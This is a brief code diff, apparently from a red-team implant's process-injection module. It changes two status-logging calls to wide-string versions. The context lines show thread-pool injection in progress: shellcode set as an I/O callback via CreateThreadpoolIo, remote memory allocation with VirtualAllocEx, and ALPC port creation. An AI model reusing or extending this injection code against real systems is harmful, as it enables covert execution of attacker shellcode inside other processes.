@@ -85,7 +85,7 @@ void ExecuteWriteIO(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE
         returnError("CreateFileW", 0);
         goto cleanUp;
     }
-	BadgerDispatch(g_dispatch, "[+] Created I/O file: '%ls'\n", ioWriteFile);
+	BadgerDispatchW(g_dispatch, L"[+] Created I/O file: '%s'\n", ioWriteFile);
 	pTpIo = (PFULL_TP_IO)Kernel32$CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)(shellcode), NULL, NULL);
     if (! pTpIo) {
         returnError("CreateThreadpoolIo", 0);
@@ -184,7 +184,7 @@ void ExecuteALPC(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE_T 
         returnError("NtAlpcCreatePort (pool)", ntError);
 		return;
 	}
-	BadgerDispatch(g_dispatch, "[+] Created thread pool ALPC port '%ls': %d\n", finalPortName, hAlpcPort);
+	BadgerDispatchW(g_dispatch, L"[+] Created thread pool ALPC port '%s': %d\n", finalPortName, hAlpcPort);
 
 	pRemoteTpAlpc = (PFULL_TP_ALPC) Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (! pRemoteTpAlpc) {
